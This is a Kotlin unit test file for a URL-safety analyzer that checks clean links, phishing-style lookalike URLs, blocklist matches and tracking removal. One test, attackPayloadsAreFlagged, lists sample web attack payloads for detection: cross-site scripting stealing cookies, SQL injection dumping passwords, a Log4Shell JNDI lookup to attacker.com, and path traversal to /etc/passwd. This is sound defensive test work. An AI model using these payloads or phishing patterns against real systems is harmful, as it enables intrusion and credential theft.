package app.sift.engine

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class UrlAnalyzerTest {
    private val psl = PublicSuffixList(File("src/main/assets/public_suffix_list.dat").readLines().asSequence())
    private val analyzer = UrlAnalyzer(psl, Blocklist.parse("0.0.0.0 evil-blocked.com\nhttps://compromised.org/wp/x.php"))
    private val extractor = UrlExtractor(psl)

    private fun verdict(u: String) = analyzer.analyze(u).verdict

    @Test fun benignLinksAreClean() {
        listOf(
            "https://www.google.com/search?q=kotlin",
            "https://github.com/vqzjcrz/MilGuard/releases",
            "https://www.amazon.co.uk/dp/B08N5WRWNW?utm_source=share",
            "https://mail.navyfederal.org/login",
            "https://www.applebees.com/en/menu",
            "https://accounts.google.com/signin/v2/identifier",
            "https://www.army.mil/article/12345",
            "https://stackoverflow.com/questions/123/how-to-select-from-table-where-id-is-null",
            "https://shop.costco.ca",
            "https://münchen.de/",
        ).forEach { assertEquals(it, Verdict.LOOKS_CLEAN, verdict(it)) }
    }

    @Test fun phishingIsDangerousOrSuspicious() {
        listOf(
            "https://paypal.com.secure-login.verify-account.ru/webscr",
            "https://paypa1.com/signin",
            "https://www.microsoft.com@evil.example.net/login",
            "https://xn--80ak6aa92e.com/",
            "https://аpple.com/",
            "https://usps-redelivery.top/track",
            "https://steamcommunlty.com/tradeoffer/new",
            "http://3232235777/admin",
            "https://www.google.com/url?q=https://paypal-secure-login.tk/x",
            "https://cdn.discordapp.com/attachments/1/2/Invoice.pdf.exe",
        ).forEach { assertTrue(it, verdict(it) >= Verdict.SUSPICIOUS) }
    }

    @Test fun attackPayloadsAreFlagged() {
        listOf(
            "https://victim.com/search?q=<script>alert(document.cookie)</script>",
            "https://victim.com/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
            "https://victim.com/?x=\${jndi:ldap://attacker.com/a}",
            "https://victim.com/download?file=../../../../etc/passwd",
            "javascript://%0aalert(document.domain)",
        ).forEach { assertTrue(it, verdict(it) >= Verdict.SUSPICIOUS) }
    }

    @Test fun blocklistMatches() {
        assertEquals(Verdict.DANGEROUS, verdict("https://sub.evil-blocked.com/x"))
        assertEquals(Verdict.DANGEROUS, verdict("hxxps[://]evil-blocked[.]com/a"))
        assertEquals(Verdict.DANGEROUS, verdict("https://compromised.org/wp/x.php"))
    }

    @Test fun extractorFindsLinks() {
        assertEquals(listOf("https://bit.ly/3xYz"), extractor.extract("Check this: https://bit.ly/3xYz!! (via @bob)"))
        assertEquals(listOf("usps-redelivery.top/track?id=1"), extractor.extract("Your package: usps-redelivery.top/track?id=1. Reply STOP"))
        assertTrue(extractor.extract("read file.txt and e.g. this").isEmpty())
    }

    @Test fun cleanUrlStripsTracking() {
        assertEquals("https://shop.com/p?id=4#top", CleanUrl.clean("https://shop.com/p?id=4&utm_source=x&fbclid=abc#top"))
    }
}
